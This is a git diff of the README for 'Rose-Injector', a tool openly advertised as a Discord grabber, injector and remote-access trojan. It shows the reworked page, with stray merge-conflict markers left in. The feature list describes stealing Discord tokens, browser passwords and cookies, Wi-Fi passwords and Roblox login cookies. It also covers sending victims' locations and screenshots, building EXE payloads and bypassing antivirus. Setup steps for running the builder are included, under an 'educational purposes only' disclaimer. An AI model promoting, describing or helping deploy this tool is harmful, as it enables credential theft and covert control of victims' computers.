@@ -1,12 +1,11 @@
-<a id="top"></a>
 <h1 align="center">
   <br>
-  <a href="https://github.com/DamagingRose/Rose-Injector"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/Rose.jpeg" width=300 weigth=400 alt="R"></a>
-  <br>
- Rose
+  <a href="https://github.com/DamagingRose/Rose-Injector"><img src="https://media.discordapp.net/attachments/1118940500217577513/1119319461401460816/image.png?width=581&height=580" width=300 weigth=400 alt="R"></a>
   <br>
 </h1>
+
 <div align="center">
+=======
     <a href="https://discord.gg/gz5fUCkw8p"><img src="https://img.shields.io/badge/Discord-%235865F2.svg?style=for-the-badge&logo=discord&logoColor=white"></a>
     <br>
     <a href="https://deepsource.io/gh/DamagingRose/Rose-Injector/?ref=repository-badge}" target="_blank"><img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Injector.svg/?label=active+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/></a>
@@ -15,20 +14,25 @@
     <br>
     <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Injector?color=%23000000">
     <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
-    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Injector?color=%23000000">
+    <br>
+    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Injector?color=%23000000"> 
     <img src="https://img.shields.io/github/last-commit/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
     <br>
     <img src="https://img.shields.io/github/issues/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
     <img src="https://img.shields.io/github/issues-closed/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
     <br>
 </div>
+
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
 <div align="center">
     <br>
     <h1>
-        The best Discord Grabber, Injector and RAT🔒
+        The Best Discord Grabber, Injector, and RAT
     </h1>
+</div>
+
+## Table Of Contents
     <strong><a href="https://discord.gg/gz5fUCkw8p">Discord</a> | by <a href="https://github.com/xpierroz">pierro</a>, <a href="https://github.com/Gumbobrot">Gumbobrot</a>, <a href="https://github.com/suvan1911">suvan</a>, <a href="https://github.com/suegdu">suegdu</a></strong>
 </div>
 
@@ -59,53 +63,46 @@ Rose is a powerful multipurposes grabber, injector & include a [RAT](https://git
 
 ## <a id="features"></a> 🔰 〢 Features
 
-- `Logs Discord Token and Discord Account Info`🟢
-- `Logs PC Info and IP`🟢
-- `Logs Browser Passwords`🟢
-- `Logs Browser Cookies`🟢
-- `Logs WiFi Names and WiFi Passwords`🟢
-- `Logs Roblox Account Data and Login Cookie`🟢
-- `Sends you the Victim's Location and Desktop Screenshot`🟢
-- `Start Up integration`🟢
-- `JavaScript Injector: Discord Passwords, Names, Emails, Phone Numbers, successfully purchased Nitro Codes will be sent to your Webhook`🟢
-- `Discord RAT`🟢
-- `UI Integration`🟢
-- `Compiler that creates an EXE File for you`🟢
-- `MacOS Adaptation`🔴
-- `VirusTotal/VM Bypass/Blacklist`🟣
-- `Bypass/Disable Windows Defender/Firewalls`🟣
+- [Description](#description)
+- [Features](#features)
+- [Setup](#setup)
+- [Preview](#preview)
+- [Changelogs](#changelogs)
+- [Contributors](#contributors)
+- [Credits](#credits)
+- [Important](#important)
 
-🟢 = Working | 🟡 = To Do | 🟣 = Working on it | 🔴 = Not Working
+## Description
 
-## <a id="rose_rat"></a> 💀 〢 Rose RAT
+Rose is a powerful multipurpose grabber, injector, and includes a [RAT](https://github.com/DamagingRose/Rose-RAT).
 
-To use the rat, check [this](https://github.com/DamagingRose/Rose-RAT)
+## Features
 
-### <a id="prerequisites"></a> 💻 〢 Prerequisites
+- `Logs Discord token and Discord account info`
+- `Logs PC info and IP`
+- `Logs browser passwords`
+- `Logs browser cookies`
+- `Logs Wi-Fi names and Wi-Fi passwords`
+- `Logs Roblox account data and login cookie`
+- `Sends you the victim's location and desktop screenshot`
+- `Startup integration`
+- `JavaScript injector: Discord passwords, names, emails, phone numbers, successfully purchased Nitro Codes will be sent to your webhook`
+- `Discord RAT`
+- `UI integration`
+- `Compiler that creates an EXE file for you`
+- `VirusTotal/VM bypass/blacklist - WIP`
+- `Bypass/disable Windows Defender/Firewalls - WIP`
 
-- Windows 7/10/11
+### Setup
 
-`Following requirements are being installed automatically.`
+- Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip).
+- Run the [`builder.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/builder.bat) to open up the Rose builder/Python installer.
 
-- **[Python](https://www.python.org)**
-- PyPi requirements
+## Preview
 
-### <a id="setup"></a> ⚙️ 〢 Setup
+<img src="https://media.discordapp.net/attachments/1118940500217577513/1119311790174634114/image.png" width="300" height="320">
 
-Don't forget that the project is still under development release and might contain bugs.
-
-- [Download the repository](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip)
-- Run the `builer.bat` to open up the Rose builder/Python installer.
-- Enjoy!
-
-## <a id="preview"></a> 📷 〢 Preview
-
-![V8](readme/v8.png)
-![Grabber](readme/grabber.png)
-![Injector](readme/injector.png)
-![Locations](readme/locationss.png)
-
-## <a id="changelog"></a> 📚 〢 Changelog
+## <a id="changelogs"></a>Changelogs
 ```
 [1.1] - 2023-06-12
 Repaired the project
@@ -121,35 +118,27 @@ First Release
 - Created a UI compiler for the Rose Grabber
 - Made the first version of the RAT
 ```
-## <a id="contributs"></a> 🥷 〢 Contributors
 
-<a href="https://github.com/DamagingRose/Rose-Injector/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=DamagingRose/Rose-Injector" />
-</a>
-
-## <a id="bugsorerrors"></a> ⚠️ 〢 Bugs Or Errors?
-
+## Bugs Or Errors?
+=======
 - To Report An Error Make An **[Issue](https://github.com/DamagingRose/Rose-Injector/issues)**
 - Or Join The **[Discord](https://discord.gg/gz5fUCkw8p)**
 
-## <a id="history"></a> ⭐ 〢 History
+- To report an error, make an [issue](https://github.com/DamagingRose/Rose-Injector/issues).
 
-- 2023-04-19 - xpierroz finally starts again the project
-- 2023-03-26 - xpierroz's last commit before quitting, svn and suegdu quitted then
-- 2023-03-21 - The first version is finally out
-- 2023-03-10 - The repository is created
+## Credits
 
-## <a id="credits"></a> 🦹 〢 Credits
 - [xpierroz](https://github.com/xpierroz)
 - [Gumbobrot](https://github.com/Gumbobrot)
 - [suegdu](https://github.com/suegdu)
 - [svn](https://github.com/suvan1911)
-
-External credits:
+- [skid](https://github.com/I-Skid)
 - [Smug246](https://github.com/Smug246) (Python Injector)
 - [Rdimo](https://github.com/Rdimo) (JavaScript Injection)
 - [loTus04](https://github.com/loTus04) (W4SP Stealer)
 
+## Important
+=======
 [![Stargazers repo roster for @DamagingRose/Rose-Injector](https://reporoster.com/stars/dark/DamagingRose/Rose-Injector)](https://github.com/DamagingRose/Rose-Injector/stargazers)
 
 ## Star History
@@ -166,4 +155,4 @@ The author of this program is not liable for any damage, harm, or legal conseque
 
 ### Rose Injector is licensed under the <a href="https://mit-license.org/.">MIT License</a>
 
-<p align="center"><a href=#top>Back to Top</a></p>
+### This is for educational purposes only. Use at your own risk. I am not responsible for any of your actions!
